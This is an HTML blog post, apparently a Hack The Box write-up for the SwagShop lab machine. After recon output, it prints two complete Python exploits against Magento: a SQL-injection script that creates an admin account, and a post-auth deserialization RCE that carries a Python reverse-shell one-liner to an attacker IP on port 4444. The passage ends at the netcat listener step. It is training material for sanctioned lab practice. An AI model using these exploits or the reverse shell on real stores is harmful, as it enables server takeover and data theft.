@@ -1,0 +1,515 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <title>nullarmor | SwagShop - Hack The Box</title>
+  <meta name="description" content="Resolution of the SwagShop machine">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <meta property="og:title" content="SwagShop - Hack The Box">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://nullarmor.github.io/posts/swagshop">
+  <meta property="og:description" content="Resolution of the SwagShop machine">
+  <meta property="og:site_name" content="nullarmor">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:url" content="https://nullarmor.github.io/posts/swagshop">
+  <meta name="twitter:title" content="SwagShop - Hack The Box">
+  <meta name="twitter:description" content="Resolution of the SwagShop machine">
+  <meta name="google-site-verification" content="1sfOj2zDu7c444806MBQqbqFzNWxik880zgryQLMj-o" />
+
+  
+    
+      <meta property="og:image" content="https://nullarmor.github.io/assets/hackthebox/swagshop/swagshop-00-409220d5fdb5edafd1f5006ed38f9d4d3192cacb8ef395986aaad52d539985d8.png">
+      <meta name="twitter:image" content="https://nullarmor.github.io/assets/hackthebox/swagshop/swagshop-00-409220d5fdb5edafd1f5006ed38f9d4d3192cacb8ef395986aaad52d539985d8.png">
+    
+  
+
+  <link href="https://nullarmor.github.io/feed.xml" type="application/rss+xml" rel="alternate" title="nullarmor Last 10 blog posts" />
+
+  
+
+  
+
+    
+      <link rel="icon" type="image/x-icon" href="/assets/favicon-5df081ea197cddd592e345971da85e359e2f613dae2506c368835a695a297f82.gif">
+      <link rel="apple-touch-icon" href="/assets/favicon-5df081ea197cddd592e345971da85e359e2f613dae2506c368835a695a297f82.gif">
+      <link rel="stylesheet" type="text/css" title="light" id="light" href="/assets/light-fd3e34295723b96a04f635903b3650e5bb101ebdcc4d959165c3b4d2d88abe5e.css">
+      <link rel="stylesheet" type="text/css" title="dark" id="dark" href="/assets/dark-0f2545b8bdef934d32dd563b17074c614e7f4f4d5c3e682d4089a07fed36aa84.css" disabled="false">
+    
+
+  
+
+</head>
+
+<body>
+  <main>
+    <div class="grid grid-centered">
+      <div class="grid-cell">
+        <nav class="header-nav scrollappear">
+  <a href="/" class="header-logo" title="nullarmor">nullarmor</a>
+  <ul class="header-links">
+    
+      <li>
+        <a href="/about" title="About me">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-about">
+  <use href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about" xlink:href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+      <li>
+        <a href="https://twitter.com/nullarmor" rel="noreferrer noopener" target="_blank" title="Twitter">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-twitter">
+  <use href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter" xlink:href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+      <li>
+        <a href="https://github.com/nullarmor" rel="noreferrer noopener" target="_blank" title="GitHub">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-github">
+  <use href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github" xlink:href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+    
+    
+    
+      <li>
+        <a href="https://www.linkedin.com/in/renan-almeida-8137a81a6" rel="noreferrer noopener" target="_blank" title="LinkedIn">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-linkedin">
+  <use href="/assets/linkedin-cdc5c107044324a3dfbea2e9ead15873f8dee304c37d73a046988956b706256e.svg#icon-linkedin" xlink:href="/assets/linkedin-cdc5c107044324a3dfbea2e9ead15873f8dee304c37d73a046988956b706256e.svg#icon-linkedin"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+      <li>
+        <a href="mailto:nullarmor@protonmail.com" title="Email">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-email">
+  <use href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email" xlink:href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+      <li>
+        <a onclick="toggle()" title="Toggle Theme">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-theme">
+  <use href="/assets/theme-66869e0bf8dab34bae1c86bda400327b772e0be69e8dc28d3ede896e771320ed.svg#icon-theme" xlink:href="/assets/theme-66869e0bf8dab34bae1c86bda400327b772e0be69e8dc28d3ede896e771320ed.svg#icon-theme"></use>
+</svg>
+
+        </a>
+      </li>
+    
+  </ul>
+</nav>
+
+
+  <ul class="header-tags scrollappear">
+    
+    
+      
+        <li><a href="/tag/ctf">Ctf</a></li>
+    
+      
+        <li><a href="/tag/cybrics">Cybrics</a></li>
+    
+      
+        <li><a href="/tag/hackthebox">Hackthebox</a></li>
+    
+      
+        <li><a href="/tag/hacktivitycon">Hacktivitycon</a></li>
+    
+      
+        <li><a href="/tag/pwn">Pwn</a></li>
+    
+      
+        <li><a href="/tag/rev">Rev</a></li>
+    
+      
+        <li><a href="/tag/rgbctf">Rgbctf</a></li>
+    
+      
+        <li><a href="/tag/web">Web</a></li>
+    
+  </ul>
+
+
+        <article class="article scrollappear">
+          <header class="article-header">
+            <h1>SwagShop - Hack The Box</h1>
+            <p>Resolution of the SwagShop machine</p>
+            <div class="article-list-footer">
+  <span class="article-list-date">
+    May 17, 2020
+  </span>
+  <span class="article-list-divider">-</span>
+  <span class="article-list-minutes">
+    
+    
+      8 minute read
+    
+  </span>
+  <span class="article-list-divider">-</span>
+  <div class="article-list-tags">
+    
+      
+      <a href="/tag/hackthebox" title="See all posts with tag 'HackTheBox'">HackTheBox</a>
+    
+  </div>
+</div>
+          </header>
+
+          <div class="article-content">
+            <p><a href="/assets/hackthebox/swagshop/swagshop-00-409220d5fdb5edafd1f5006ed38f9d4d3192cacb8ef395986aaad52d539985d8.png">
+  <img src="/assets/hackthebox/swagshop/swagshop-00-409220d5fdb5edafd1f5006ed38f9d4d3192cacb8ef395986aaad52d539985d8.png" alt="SwagShop banner" class="zooming" data-rjs="/assets/hackthebox/swagshop/swagshop-00-409220d5fdb5edafd1f5006ed38f9d4d3192cacb8ef395986aaad52d539985d8.png" data-zooming-width="596" data-zooming-height="378" />
+</a></p>
+
+<p>SwagShop is an easy level machine based on Linux, a funny box where the initial exploit consists of exploiting the web application named <code class="highlighter-rouge">Magento</code>. The privilege escalation phase is easy and doesn’t require more than some minutes to find and exploit it.</p>
+
+<h1 id="recon">Recon</h1>
+
+<p>Starting with Nmap:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="c"># Nmap 7.70 scan initiated Thu Dec 26 16:19:27 2019 as: nmap -sV -sC -T4 -oA swagshop -p- 10.10.10.140</span>
+Nmap scan report <span class="k">for </span>10.10.10.140
+Host is up <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec <span class="o">(</span>RSA<span class="o">)</span>
+|   256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Home page
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+<span class="c"># Nmap done at Thu Dec 26 16:33:16 2019 -- 1 IP address (1 host up) scanned in 829.04 seconds</span></code></pre></figure>
+
+<p>Accessing the port 80 we can see a web application named <code class="highlighter-rouge">Magento eCommerce</code> running:</p>
+
+<p><a href="/assets/hackthebox/swagshop/swagshop-01-0681606b608c97adfcdba893b282e4d430dcae23084d6fd56aa670feb83494fb.png">
+  <img src="/assets/hackthebox/swagshop/swagshop-01-0681606b608c97adfcdba893b282e4d430dcae23084d6fd56aa670feb83494fb.png" alt="SwagShop Web" class="zooming" data-rjs="/assets/hackthebox/swagshop/swagshop-01-0681606b608c97adfcdba893b282e4d430dcae23084d6fd56aa670feb83494fb.png" data-zooming-width="1264" data-zooming-height="431" />
+</a></p>
+
+<p>After it we need to enumerate some directories and files using a tool named <a href="https://github.com/OJ/gobuster" target="_blank">gobuster</a>:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">gobuster <span class="nb">dir</span> <span class="nt">-w</span> /usr/share/wordlists/dirb/big.txt <span class="nt">-u</span> http://10.10.10.140 <span class="nt">-t20</span>
+<span class="o">===============================================================</span>
+Gobuster v3.0.1
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:            http://10.10.10.140
+<span class="o">[</span>+] Threads:        20
+<span class="o">[</span>+] Wordlist:       /usr/share/wordlists/dirb/big.txt
+<span class="o">[</span>+] Status codes:   200,204,301,302,307,401,403
+<span class="o">[</span>+] User Agent:     gobuster/3.0.1
+<span class="o">[</span>+] Timeout:        10s
+<span class="o">===============================================================</span>
+2019/12/26 17:36:22 Starting gobuster
+<span class="o">===============================================================</span>
+/.htaccess <span class="o">(</span>Status: 403<span class="o">)</span>
+/.htpasswd <span class="o">(</span>Status: 403<span class="o">)</span>
+/app <span class="o">(</span>Status: 301<span class="o">)</span>
+/errors <span class="o">(</span>Status: 301<span class="o">)</span>
+/favicon.ico <span class="o">(</span>Status: 200<span class="o">)</span>
+/includes <span class="o">(</span>Status: 301<span class="o">)</span>
+/js <span class="o">(</span>Status: 301<span class="o">)</span>
+/lib <span class="o">(</span>Status: 301<span class="o">)</span>
+/media <span class="o">(</span>Status: 301<span class="o">)</span>
+/pkginfo <span class="o">(</span>Status: 301<span class="o">)</span>
+/server-status <span class="o">(</span>Status: 403<span class="o">)</span>
+/shell <span class="o">(</span>Status: 301<span class="o">)</span>
+/skin <span class="o">(</span>Status: 301<span class="o">)</span>
+/var <span class="o">(</span>Status: 301<span class="o">)</span>
+<span class="o">===============================================================</span>
+2019/12/26 17:38:51 Finished
+<span class="o">===============================================================</span></code></pre></figure>
+
+<p>Among all these directories, the most interesting directory is <code class="highlighter-rouge">/app</code> but this directory will be useful in the future.</p>
+
+<p>Searching on Google for Magento eCommerce exploits we found 2 interesting exploits:</p>
+
+<p><a href="/assets/hackthebox/swagshop/swagshop-02-76a84f4d00105ee9ac084a2148f9d8429e5f24e3a98d844f9fda0085d77683b9.png">
+  <img src="/assets/hackthebox/swagshop/swagshop-02-76a84f4d00105ee9ac084a2148f9d8429e5f24e3a98d844f9fda0085d77683b9.png" alt="SwagShop Web" class="zooming" data-rjs="/assets/hackthebox/swagshop/swagshop-02-76a84f4d00105ee9ac084a2148f9d8429e5f24e3a98d844f9fda0085d77683b9.png" data-zooming-width="855" data-zooming-height="480" />
+</a></p>
+
+<p>The first one is a <code class="highlighter-rouge">SQLi vulnerability</code> that allow us to create an admin profile and the last one is a vulnerability that <code class="highlighter-rouge">inject commands</code> through the web application.</p>
+
+<h1 id="exploiting---exploiting-the-magento-web-application">Exploiting - Exploiting the Magento web application</h1>
+
+<p>The first step to exploit the web application is using the first exploit that we found to create an admin profile, so we can get access to the administrator panel where the second vulnerability exists.</p>
+
+<p><a href="/assets/hackthebox/swagshop/swagshop-03-8882a2c0800cfa2a90ef70daf12ebfe25d89ffe3c8625c981aa8f37aaf2c7223.png">
+  <img src="/assets/hackthebox/swagshop/swagshop-03-8882a2c0800cfa2a90ef70daf12ebfe25d89ffe3c8625c981aa8f37aaf2c7223.png" alt="SwagShop Web" class="zooming" data-rjs="/assets/hackthebox/swagshop/swagshop-03-8882a2c0800cfa2a90ef70daf12ebfe25d89ffe3c8625c981aa8f37aaf2c7223.png" data-zooming-width="1001" data-zooming-height="432" />
+</a></p>
+
+<p>Now we execute the following exploit (the first one): <a href="https://www.exploit-db.com/exploits/37977" target="_blank">Magento eCommerce - Remote Code Execution</a></p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">base64</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="n">target</span> <span class="o">=</span> <span class="s">"http://10.10.10.140/index.php"</span>
+
+<span class="k">if</span> <span class="ow">not</span> <span class="n">target</span><span class="p">.</span><span class="n">startswith</span><span class="p">(</span><span class="s">"http"</span><span class="p">):</span>
+    <span class="n">target</span> <span class="o">=</span> <span class="s">"http://"</span> <span class="o">+</span> <span class="n">target</span>
+
+<span class="k">if</span> <span class="n">target</span><span class="p">.</span><span class="n">endswith</span><span class="p">(</span><span class="s">"/"</span><span class="p">):</span>
+    <span class="n">target</span> <span class="o">=</span> <span class="n">target</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+
+<span class="n">target_url</span> <span class="o">=</span> <span class="n">target</span> <span class="o">+</span> <span class="s">"/admin/Cms_Wysiwyg/directive/index/"</span>
+
+<span class="n">q</span><span class="o">=</span><span class="s">"""
+SET @SALT = 'rp';
+SET @PASS = CONCAT(MD5(CONCAT( @SALT , '{password}') ), CONCAT(':', @SALT ));
+SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;
+INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES ('Firstname','Lastname','email@example.com','{username}',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());
+INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '{username}'),'Firstname');
+"""</span>
+
+
+<span class="n">query</span> <span class="o">=</span> <span class="n">q</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">).</span><span class="nb">format</span><span class="p">(</span><span class="n">username</span><span class="o">=</span><span class="s">"nullarmor"</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="s">"nullarmor"</span><span class="p">)</span>
+<span class="n">pfilter</span> <span class="o">=</span> <span class="s">"popularity[from]=0&amp;popularity[to]=3&amp;popularity[field_expr]=0);{0}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">query</span><span class="p">)</span>
+
+<span class="c1"># e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ decoded is
+</span><span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">target_url</span><span class="p">,</span> 
+                  <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s">"___directive"</span><span class="p">:</span> <span class="s">"e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ"</span><span class="p">,</span>
+                        <span class="s">"filter"</span><span class="p">:</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">pfilter</span><span class="p">),</span>
+                        <span class="s">"forwarded"</span><span class="p">:</span> <span class="mi">1</span><span class="p">})</span>
+<span class="k">if</span> <span class="n">r</span><span class="p">.</span><span class="n">ok</span><span class="p">:</span>
+    <span class="k">print</span> <span class="s">"WORKED"</span>
+    <span class="k">print</span> <span class="s">"Check {0}/admin with creds nullarmor:nullarmor"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="k">print</span> <span class="s">"DID NOT WORK"</span></code></pre></figure>
+
+<p>If everything goes fine then we will able to login with the credentials defined inside the exploit (<code class="highlighter-rouge">nullarmor:nullarmor</code>)</p>
+
+<p><a href="/assets/hackthebox/swagshop/swagshop-04-5e3de27f6de38fa8c471d40acc73cc80831616ef9b945d634cf950d287613de9.png">
+  <img src="/assets/hackthebox/swagshop/swagshop-04-5e3de27f6de38fa8c471d40acc73cc80831616ef9b945d634cf950d287613de9.png" alt="SwagShop Exploit" class="zooming" data-rjs="/assets/hackthebox/swagshop/swagshop-04-5e3de27f6de38fa8c471d40acc73cc80831616ef9b945d634cf950d287613de9.png" data-zooming-width="517" data-zooming-height="47" />
+</a></p>
+
+<p><a href="/assets/hackthebox/swagshop/swagshop-05-fa302e93ccb9fa3a20858cb59e8fa027e3a4ead1b86ac0213e8a7f2a3482239a.png">
+  <img src="/assets/hackthebox/swagshop/swagshop-05-fa302e93ccb9fa3a20858cb59e8fa027e3a4ead1b86ac0213e8a7f2a3482239a.png" alt="SwagShop Exploit" class="zooming" data-rjs="/assets/hackthebox/swagshop/swagshop-05-fa302e93ccb9fa3a20858cb59e8fa027e3a4ead1b86ac0213e8a7f2a3482239a.png" data-zooming-width="1248" data-zooming-height="502" />
+</a></p>
+
+<p>Now the next step requires a small fix in the second exploit and we need to add our credentials in it:</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/python
+# Exploit Title: Magento CE &lt; 1.9.0.1 Post Auth RCE 
+# Google Dork: "Powered by Magento"
+# Date: 08/18/2015
+# Exploit Author: @Ebrietas0 || http://ebrietas0.blogspot.com
+# Vendor Homepage: http://magento.com/
+# Software Link: https://www.magentocommerce.com/download
+# Version: 1.9.0.1 and below
+# Tested on: Ubuntu 15
+# CVE : none
+</span>
+<span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">md5</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">re</span>
+<span class="kn">import</span> <span class="nn">base64</span>
+<span class="kn">import</span> <span class="nn">mechanize</span>
+
+
+<span class="k">def</span> <span class="nf">usage</span><span class="p">():</span>
+    <span class="k">print</span> <span class="s">"Usage: python %s &lt;target&gt; &lt;argument&gt;</span><span class="se">\n</span><span class="s">Example: python %s http://localhost </span><span class="se">\"</span><span class="s">uname -a</span><span class="se">\"</span><span class="s">"</span>
+    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">()</span>
+
+
+<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">:</span>
+    <span class="n">usage</span><span class="p">()</span>
+
+<span class="c1"># Command-line args
+</span><span class="n">target</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">rce</span> <span class="o">=</span> <span class="s">"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""</span>
+
+<span class="c1"># Config.
+</span><span class="n">username</span> <span class="o">=</span> <span class="s">'nullarmor'</span>
+<span class="n">password</span> <span class="o">=</span> <span class="s">'nullarmor'</span>
+<span class="n">php_function</span> <span class="o">=</span> <span class="s">'system'</span>  <span class="c1"># Note: we can only pass 1 argument to the function
+</span><span class="n">install_date</span> <span class="o">=</span> <span class="s">'Wed, 08 May 2019 07:23:09 +0000'</span>  <span class="c1"># This needs to be the exact date from /app/etc/local.xml
+</span>          
+<span class="c1"># POP chain to pivot into call_user_exec
+</span><span class="n">payload</span> <span class="o">=</span> <span class="s">'O:8:</span><span class="se">\"</span><span class="s">Zend_Log</span><span class="se">\"</span><span class="s">:1:{s:11:</span><span class="se">\"\00</span><span class="s">*</span><span class="se">\00</span><span class="s">_writers</span><span class="se">\"</span><span class="s">;a:2:{i:0;O:20:</span><span class="se">\"</span><span class="s">Zend_Log_Writer_Mail</span><span class="se">\"</span><span class="s">:4:{s:16:'</span> \
+          <span class="s">'</span><span class="se">\"\00</span><span class="s">*</span><span class="se">\00</span><span class="s">_eventsToMail</span><span class="se">\"</span><span class="s">;a:3:{i:0;s:11:</span><span class="se">\"</span><span class="s">EXTERMINATE</span><span class="se">\"</span><span class="s">;i:1;s:12:</span><span class="se">\"</span><span class="s">EXTERMINATE!</span><span class="se">\"</span><span class="s">;i:2;s:15:</span><span class="se">\"</span><span class="s">'</span> \
+          <span class="s">'EXTERMINATE!!!!</span><span class="se">\"</span><span class="s">;}s:22:</span><span class="se">\"\00</span><span class="s">*</span><span class="se">\00</span><span class="s">_subjectPrependText</span><span class="se">\"</span><span class="s">;N;s:10:</span><span class="se">\"\00</span><span class="s">*</span><span class="se">\00</span><span class="s">_layout</span><span class="se">\"</span><span class="s">;O:23:</span><span class="se">\"</span><span class="s">'</span>     \
+          <span class="s">'Zend_Config_Writer_Yaml</span><span class="se">\"</span><span class="s">:3:{s:15:</span><span class="se">\"\00</span><span class="s">*</span><span class="se">\00</span><span class="s">_yamlEncoder</span><span class="se">\"</span><span class="s">;s:6:</span><span class="se">\"</span><span class="s">system</span><span class="se">\"</span><span class="s">;s:17:</span><span class="se">\"\00</span><span class="s">*</span><span class="se">\00</span><span class="s">'</span>     \
+          <span class="s">'_loadedSection</span><span class="se">\"</span><span class="s">;N;s:10:</span><span class="se">\"\00</span><span class="s">*</span><span class="se">\00</span><span class="s">_config</span><span class="se">\"</span><span class="s">;O:13:</span><span class="se">\"</span><span class="s">Varien_Object</span><span class="se">\"</span><span class="s">:1:{s:8:</span><span class="se">\"\00</span><span class="s">*</span><span class="se">\00</span><span class="s">_data</span><span class="se">\"</span><span class="s">'</span> \
+          <span class="s">';s:'</span><span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">rce</span><span class="p">))</span> <span class="o">+</span><span class="s">':</span><span class="se">\"</span><span class="s">'</span> <span class="o">+</span> <span class="n">rce</span> <span class="o">+</span> <span class="s">'</span><span class="se">\"</span><span class="s">;}}s:8:</span><span class="se">\"\00</span><span class="s">*</span><span class="se">\00</span><span class="s">_mail</span><span class="se">\"</span><span class="s">;O:9:</span><span class="se">\"</span><span class="s">Zend_Mail</span><span class="se">\"</span><span class="s">:0:{}}i:1;i:2;}}'</span>
+          
+<span class="c1"># Setup the mechanize browser and options
+</span><span class="n">br</span> <span class="o">=</span> <span class="n">mechanize</span><span class="p">.</span><span class="n">Browser</span><span class="p">()</span>
+<span class="c1">#br.set_proxies({"http": "localhost:8080"})
+</span><span class="n">br</span><span class="p">.</span><span class="n">set_handle_robots</span><span class="p">(</span><span class="bp">False</span><span class="p">)</span>
+
+<span class="n">request</span> <span class="o">=</span> <span class="n">br</span><span class="p">.</span><span class="nb">open</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
+
+<span class="n">br</span><span class="p">.</span><span class="n">select_form</span><span class="p">(</span><span class="n">nr</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">br</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="n">new_control</span><span class="p">(</span><span class="s">'text'</span><span class="p">,</span> <span class="s">'login[username]'</span><span class="p">,</span> <span class="p">{</span><span class="s">'value'</span><span class="p">:</span> <span class="n">username</span><span class="p">})</span>  <span class="c1"># Had to manually add username control.
+</span><span class="n">br</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="n">fixup</span><span class="p">()</span>
+<span class="n">br</span><span class="p">[</span><span class="s">'login[username]'</span><span class="p">]</span> <span class="o">=</span> <span class="n">username</span>
+<span class="n">br</span><span class="p">[</span><span class="s">'login[password]'</span><span class="p">]</span> <span class="o">=</span> <span class="n">password</span>
+
+<span class="n">br</span><span class="p">.</span><span class="n">method</span> <span class="o">=</span> <span class="s">"POST"</span>
+<span class="n">request</span> <span class="o">=</span> <span class="n">br</span><span class="p">.</span><span class="n">submit</span><span class="p">()</span>
+<span class="n">content</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="s">"ajaxBlockUrl = </span><span class="se">\'</span><span class="s">(.*)</span><span class="se">\'</span><span class="s">"</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>
+<span class="n">url</span> <span class="o">=</span> <span class="n">url</span><span class="p">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">key</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="s">"var FORM_KEY = '(.*)'"</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>
+<span class="n">key</span> <span class="o">=</span> <span class="n">key</span><span class="p">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="n">request</span> <span class="o">=</span> <span class="n">br</span><span class="p">.</span><span class="nb">open</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s">'block/tab_orders/period/1y/?isAjax=true'</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="s">'isAjax=false&amp;form_key='</span> <span class="o">+</span> <span class="n">key</span><span class="p">)</span>
+<span class="n">tunnel</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="s">"src=</span><span class="se">\"</span><span class="s">(.*)\?ga="</span><span class="p">,</span> <span class="n">request</span><span class="p">.</span><span class="n">read</span><span class="p">())</span>
+<span class="n">tunnel</span> <span class="o">=</span> <span class="n">tunnel</span><span class="p">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">gh</span> <span class="o">=</span> <span class="n">md5</span><span class="p">(</span><span class="n">payload</span> <span class="o">+</span> <span class="n">install_date</span><span class="p">).</span><span class="n">hexdigest</span><span class="p">()</span>
+
+<span class="n">exploit</span> <span class="o">=</span> <span class="n">tunnel</span> <span class="o">+</span> <span class="s">'?ga='</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="s">'&amp;h='</span> <span class="o">+</span> <span class="n">gh</span>
+
+<span class="k">try</span><span class="p">:</span>
+    <span class="n">request</span> <span class="o">=</span> <span class="n">br</span><span class="p">.</span><span class="nb">open</span><span class="p">(</span><span class="n">exploit</span><span class="p">)</span>
+<span class="k">except</span> <span class="p">(</span><span class="n">mechanize</span><span class="p">.</span><span class="n">HTTPError</span><span class="p">,</span> <span class="n">mechanize</span><span class="p">.</span><span class="n">URLError</span><span class="p">)</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+    <span class="k">print</span> <span class="n">e</span><span class="p">.</span><span class="n">read</span><span class="p">()</span></code></pre></figure>
+
+<p>The line 67 was changed from:</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">request</span> <span class="o">=</span> <span class="n">br</span><span class="p">.</span><span class="nb">open</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s">'block/tab_orders/period/7d/?isAjax=true'</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="s">'isAjax=false&amp;form_key='</span> <span class="o">+</span> <span class="n">key</span><span class="p">)</span></code></pre></figure>
+
+<p>to:</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">request</span> <span class="o">=</span> <span class="n">br</span><span class="p">.</span><span class="nb">open</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s">'block/tab_orders/period/1y/?isAjax=true'</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="s">'isAjax=false&amp;form_key='</span> <span class="o">+</span> <span class="n">key</span><span class="p">)</span></code></pre></figure>
+
+<p>The Python RCE stager was added inside the exploit as well:</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">rce</span> <span class="o">=</span> <span class="s">"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.7",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""</span></code></pre></figure>
+
+<p>Now we can set up our netcat on listening mode at port 4444, execute the exploit and get the reverse shell!</p>
+
